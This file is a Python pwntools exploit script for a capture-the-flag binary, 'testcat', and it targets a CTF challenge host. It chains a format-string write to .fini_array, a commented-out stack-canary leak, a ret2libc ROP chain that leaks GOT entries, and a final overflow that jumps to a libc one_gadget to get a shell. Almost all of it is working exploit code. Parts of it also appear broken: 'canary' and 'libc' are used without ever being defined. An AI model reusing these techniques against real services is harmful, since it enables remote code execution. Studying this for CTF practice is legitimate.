from pwn import *

context.binary = elf = ELF('testcat')  # have canary
context.log_level = 'debug'

printf_got = elf.got['printf']
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main = elf.symbols['main']

INPUT = b'=> '
RECEIVED = b'RECEIVED:\n'


# Find the offset of fmt string overwrite fini_array with main() so it loops back
def send_payload(payload):
    io = remote('chals.cyberthon22f.ctf.sg', 10401)
    #io = process('./testcat')
    io.sendlineafter(INPUT, payload)
    io.recvuntil(RECEIVED)
    r = io.recvall()
    io.close()
    return r


fmt = FmtStr(send_payload)  # pwntools help to send test data and find out which offset is the sent data being stored (in this chall, 6)

io = remote('chals.cyberthon22f.ctf.sg', 10401)
#io = process('./testcat')
#pause()
# Overwrite .fini_array with main() so we can loop back to main when it is supposed to exit
fini_array = 0x403E18  # .fini_array
payload = fmtstr_payload(fmt.offset, {fini_array: main})  # do format string write
print(payload)
io.sendafter(INPUT, payload)
# After this input, the program will try to exit and will loop back to main(), allowing us to get more chances to send payload and leak the canary below
io.interactive()

# def leakCanary(tries=100):
#     for i in range(1, tries+1, 1):
#         payload = f'%{i}$p'
#         io.sendline(payload.encode())
#         io.recvuntil(RECEIVED)
#         candidate = io.recvall().strip().lstrip(b'0x')
#         if len(candidate) == 16 and candidate.endswith(b'00'):  # canary is always 16 length (8 bytes), all compiler canary ends with 00 (termination byte)
#             print(f'Found canary: {candidate} at offset {i}')
#             return candidate, i
#     else:
#         raise Exception('Canary not found!')


#canary, canary_offset = leakCanary(tries=50)

to_fill = 0x110 + len(canary) + 8  # overflow 0x110 then fill with found canary then 8 bytes to overwrite rip

# Below is standard ret2libc but we have to leak 2 different libc GOT to find the libc version
rop = ROP(elf)
rop.puts(elf.got.printf)
rop.puts(elf.got.puts)
rop.main()
payload = b'A' * to_fill + rop.chain()  # Automatic way using rop chain, both works


io.recvuntil(b'=> ')
io.sendline(payload)
io.recvuntil(b'RECEIVED:')
leak = u64(io.recvline().strip().ljust(8, b'\x00'))
print('printf leak:', hex(leak))
print('puts leak:', hex(leak))
io.interactive()
libc_printf_offset = libc.symbols['printf']
# libc_system_offset = libc.symbols['system']
# BIN_SH_offset_searched = next(libc.search(b"/bin/sh"))
ONE_GADGET = 0x10a2fc  # found using one_gadget libc.so.6
# print(hex(BIN_SH_offset_searched))

libc_base = leak - libc_printf_offset
# libc_system = libc_base + libc_system_offset
# libc_BIN_SH = libc_base + BIN_SH_offset_searched
libc_one_gadget = libc_base + ONE_GADGET
# print('system:', hex(libc_system))
# print('binsh:', hex(libc_BIN_SH))

# payload = b'A' * to_fill + p64(POP_RDI) + p64(libc_BIN_SH) + p64(ret) + p64(libc_system)  # dont work due to space in payload
payload = b'A' * to_fill + p64(libc_one_gadget)  # return directly to libc onegadget
io.recvuntil(b'Enter Input =>')
io.sendline(payload)
io.interactive()